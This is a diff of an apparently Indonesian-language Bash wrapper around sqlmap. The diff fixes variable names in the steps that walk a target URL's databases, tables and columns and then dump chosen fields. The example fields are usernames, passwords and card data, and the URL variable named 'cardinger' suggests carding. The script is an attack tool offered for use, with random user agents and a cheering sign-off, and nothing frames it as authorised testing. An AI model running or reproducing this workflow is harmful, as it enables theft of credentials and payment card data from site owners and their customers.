@@ -64,9 +64,9 @@ do
 	esac
 done
 echo ""
-read -p "Ketikkan Table Yang Akan Di Buka: " tabled
+read -p "Ketikkan DATABASE Yang Akan Di Buka: " databs
 clear
-./sqlmap.py -u $cardinger --random-agent -D $tabled --tables
+./sqlmap.py -u $cardinger --random-agent -D $databs --tables
 echo ""
 		PS3='Silahkan pilih (1-2):'
 options=("Lanjut" "Keluar (Jika GAGAL)")
@@ -83,9 +83,9 @@ do
 	 *) echo invalid option;
 	esac
 done
-read -p "Ketikkan Column Yang Akan Di Buka: " columed
+read -p "Ketikkan Table Yang Akan Di Buka: " tabledd
 clear
-./sqlmap.py -u $cardinger --random-agent -D $tabled -T $columed --columns
+./sqlmap.py -u $cardinger --random-agent -D $databs -T $tabledd --columns
 echo ""
 		PS3='Silahkan pilih (1-2):'
 options=("Lanjut" "Keluar (Jika GAGAL)")
@@ -103,7 +103,7 @@ do
 	esac
 done
 echo "Contoh: UserName,UserPass,Card (Pisahkan Dengan Koma)"
-read -p "Ketikkan Nama Data Yang Mau Di Ambil: " dataed
+read -p "Ketikkan Nama Data Yang Mau Di Ambil: " colums
 clear
-./sqlmap.py -u $cardinger --random-agent -D $tabled -T $columed -C $dataed --dumps
+./sqlmap.py -u $cardinger --random-agent -D $databs -T $tabledd -C $colums --dumps
 echo "SEKIAN SEMOGA SUKSES BOSS!!!"
